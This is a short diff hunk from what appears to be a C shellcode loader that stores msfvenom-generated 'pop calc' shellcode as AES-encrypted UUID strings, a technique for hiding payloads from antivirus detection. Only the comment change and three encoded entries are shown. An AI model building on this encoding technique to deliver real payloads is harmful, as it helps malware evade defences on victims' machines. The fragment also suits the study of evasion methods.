@@ -8,7 +8,7 @@
 #pragma comment (lib, "advapi32")
 #include "helpers.h"
 
-// Pop calc shellcode created with msfvenom
+// Pop calc shellcode created with msfvenom, AES encrypted and converted to Uuids
 const char* uuids[] = { "d299b868-3f13-64ac-bb2b-34ef667e5779",
                         "13a31af6-2091-9069-bf6f-bcb5cfec2829",
                         "9d32df3b-96a0-c81c-b47f-5235f58e6199",
